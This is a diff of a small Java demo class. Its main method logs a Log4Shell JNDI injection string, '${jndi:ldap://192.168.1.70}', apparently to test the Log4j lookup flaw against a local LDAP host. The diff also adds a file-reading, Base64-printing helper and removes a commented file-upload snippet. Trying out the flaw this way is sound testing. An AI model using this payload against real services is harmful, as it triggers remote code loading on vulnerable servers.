@@ -1,7 +1,12 @@
 package com.ljq.mydemo.thread.test;
 
+import cn.hutool.core.codec.Base64;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
 
 
 /**
@@ -11,19 +16,38 @@ import org.apache.logging.log4j.Logger;
 public class test {
     private static final Logger logger= LogManager.getLogger(test.class);
 
- /*   HttpURLConnection httpConn = (HttpURLConnection) new URL("http://192.168.1.145:21122/rest-api/v1/upload").openConnection();
-            httpConn.setRequestMethod("POST");
-            httpConn.setDoOutput(true);
-    OutputStream out = httpConn.getOutputStream();
-    FileInputStream fis = new FileInputStream(fileName);
-    int len = -1;
-    byte[] buffer = new byte[100];
-            while((len = fis.read(buffer, 0, 100)) != -1) {
-        out.write(buffer, 0, len);
-        Thread.sleep(1000);
-    }*/
 
     public static void main(String[] args) {
         logger.error("${jndi:ldap://192.168.1.70}");
+    }
+
+
+    public static void bj_design_rule_xml(String filePath) {
+        try {
+            File jsonFile = new File(filePath);
+
+            if (!jsonFile.exists()) {
+                logger.info("file not exists...");
+                return;
+            }
+            // BufferedReader br = new BufferedReader(new InputStreamReader(new
+// FileInputStream(jsonFile), "UTF-8"));
+            BufferedReader br = new BufferedReader(new FileReader(jsonFile));
+            String line;
+            StringBuffer sb = new StringBuffer();
+            while ((line = br.readLine()) != null) {
+                sb.append(line);
+            }
+            br.close();
+            logger.info("Read file data ：" + jsonFile);
+
+            String stred = Base64.encode(sb.toString().getBytes("utf-8"));
+            System.out.println(stred);
+
+            // System.out.println(Base64.decodeStr(stred));
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
